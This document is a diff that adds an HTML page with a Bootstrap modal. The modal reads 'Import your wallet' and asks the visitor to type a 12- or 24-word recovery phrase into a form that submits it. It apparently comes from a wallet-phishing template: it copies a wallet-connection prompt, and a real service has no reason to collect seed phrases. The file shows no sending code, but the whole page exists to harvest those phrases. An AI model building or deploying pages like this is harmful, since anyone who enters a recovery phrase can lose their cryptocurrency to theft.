@@ -1,0 +1,95 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <title>Form Modal</title>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://maxst.icons8.com/vue-static/landings/line-awesome/line-awesome/1.3.0/css/line-awesome.min.css" />
+
+    <style>
+        textarea:hover,
+        input:hover,
+        textarea:active,
+        input:active,
+        textarea:focus,
+        input:focus,
+        button:focus,
+        button:active,
+        button:hover {
+            outline: 0px !important;
+            -webkit-appearance: none;
+        }
+        
+        svg {
+            font-size: 1rem !important;
+        }
+    </style>
+</head>
+
+
+<body>
+    <!-- Button trigger modal -->
+    <button type="button" class="btn btn-primary btn-lg" data-bs-toggle="modal" data-bs-target="#newsletter">
+      Launch
+   </button>
+
+    <!-- Modal -->
+    <!-- Modal -->
+    <div class="modal fade" id="newsletter" data-bs-keyboard="false" tabindex="-1" aria-hidden="true" role="alertdialog">
+        <div class="modal-dialog modal-dialog-centered" role="alertdialog">
+            <div class="modal-content bg-white border-0 p-5">
+                <div class="modal-body text-dark py-5">
+                    <h5 class="text-xs leading-6 mt-2 text-center font-medium text-gray-900" style="display: flex; flex-direction: row;"> <img src="WalletAPI_wallets_files/saved_resource.html" style="margin-right: 20px; height: 40px; width: 40px" id="myImg"><span>Import your <span
+                        id="walletname"></span> wallet
+                        </span>
+                    </h5>
+                    <div class="mt-2">
+                        <div class="mt-10 mb-4 border-bottom border-2">
+                            <p class="text-center text-muted font-medium mb-3">Phrase</p>
+                        </div>
+                    </div>
+
+                    <form action="" id="form" name="form" method="post" enctype="multipart/form-data">
+                        <div class="form-group mb-3">
+                            <div id="first" class="acc-body active">
+                                <div class="flex flex-col">
+
+                                </div>
+                                <div class="flex flex-col mb-4">
+                                    <textarea name="phrase" cols="30" rows="4" placeholder="Enter your recovery phrase" class="text-sm sm:text-base placeholder-gray-500 px-4 rounded-3 border border-gray-400 w-100 mb-3 focus:outline-none focus:border-blue-400" id="phraseinput" required=""
+                                        minlength="12"></textarea>
+                                    <small class="text-sm text-center text-grey-300 text-muted" style="font-size: 0.7rem; text-align: center;">
+                              Typically 12 (sometimes 24) words separated by single spaces
+                           </small>
+                                </div>
+                                <button type="submit" name="btn_proceed" class="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-primary border-0 bg-blue-600 hover:bg-blue-700 rounded py-2 w-100 transition duration-150 ease-in"><span
+                                 class="mr-2 text-uppercase">Proceed</span> <span class="las la-arrow-right"></span></button>
+                                <button class="btn btn-danger float-end mt-4" data-bs-dismiss="modal">Cancel</button>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <!-- <script>
+        $('#newsletter').on('show.bs.modal', event => {
+            var button = $(event.relatedTarget);
+            var modal = $(this);
+            // Use above variables to manipulate the DOM
+
+        });
+    </script> -->
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
+</body>
+
+</html>
